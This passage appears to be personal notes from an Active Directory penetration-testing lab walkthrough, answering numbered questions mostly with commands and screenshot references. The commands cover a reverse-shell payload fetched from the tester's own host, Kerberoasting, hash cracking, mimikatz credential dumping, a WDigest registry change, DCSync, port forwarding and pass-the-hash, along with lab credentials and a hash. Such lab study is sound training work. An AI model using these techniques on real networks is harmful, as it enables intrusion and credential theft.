with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`
### 1. Submit the contents of the flag.txt file on the administrator Desktop of the web server
```shell
gobuster dir -u http://10.129.202.242 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
![](Screenshot%202026-06-01%20at%2017.00.15.png)
![](Screenshot%202026-06-01%20at%2017.00.51.png)
![](Screenshot%202026-06-01%20at%2017.02.59.png)
### 2. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer
![](Screenshot%202026-06-01%20at%2017.05.49.png)

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.6 LPORT=4444 -f exe -o payload.exe
```
![](Screenshot%202026-06-01%20at%2017.08.09.png)

```shell
python3 -m http.server 1234
```
![](Screenshot%202026-06-01%20at%2017.08.16.png)

```powershell
curl http://10.10.15.6:1234/payload.exe -O C:\Windows\System32\payload.exe
```
![](Screenshot%202026-06-01%20at%2017.10.26.png)

```powershell
C:\Windows\System32\payload.exe
```
![](Screenshot%202026-06-01%20at%2017.11.19.png)

```powershell
setspn -Q */*
```
![](Screenshot%202026-06-01%20at%2017.13.37.png)
### 3. Crack the account's password. Submit the cleartext value.

```powershell
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```
![](Screenshot%202026-06-01%20at%2017.26.10.png)

```shell
grep -o '[A-F0-9$*:./a-zA-Z_-]\+' hash | tr -d '\n' > hash_fixed

hashcat -m 13100 hash_fixed /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-06-01%20at%2017.30.25.png)
### 4. Submit the contents of the flag.txt file on the Administrator desktop on MS01

```powershell
net use \\MS01\c$ /user:INLANEFREIGHT.LOCAL\svc_sql lucky7
type \\ms01\c$\Users\Administrator\Desktop\flag.txt
```
![](Screenshot%202026-06-01%20at%2017.32.23.png)
### 5. Find cleartext credentials for another domain user. Submit the username as your answer.

```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8888 connectaddress=172.16.6.50 connectport=3389
```
![](Screenshot%202026-06-01%20at%2017.47.30.png)

```shell
xfreerdp /u:svc_sql /p:lucky7 /v:10.129.202.242:8888 /dynamic-resolution /drive:shared,$HOME/shared
```
![](Screenshot%202026-06-01%20at%2017.55.43.png)

```cmd
privilege::debug
sekurlsa::logonpasswords
```
![](Screenshot%202026-06-01%20at%2017.56.05.png)
### 6. Submit this user's cleartext password.

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
shutdown.exe /r /t 0 /f
```

```cmd
privilege::debug
sekurlsa::logonpasswords
```
![](Screenshot%202026-06-01%20at%2018.03.10.png)
### 7. What attack can this user perform?

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid tpetty
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
![](Pasted%20image%2020260601181847.png)
### 8. Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01

```powershell
runas /user:INLANEFREIGHT\tpetty powershell.exe
```

```cmd
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
![](Screenshot%202026-06-01%20at%2018.22.39.png)

```shell
run autoroute -s 172.16.6.3
run autoroute -p
```
![](Screenshot%202026-06-01%20at%2018.24.48.png)

```shell
portfwd add -l 6666 -p 5985 -r 172.16.6.3
```
![](Pasted%20image%2020260601183137.png)

```shell
evil-winrm -i 10.10.15.16 --port 6666 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0
```
![](Pasted%20image%2020260601183151.png)
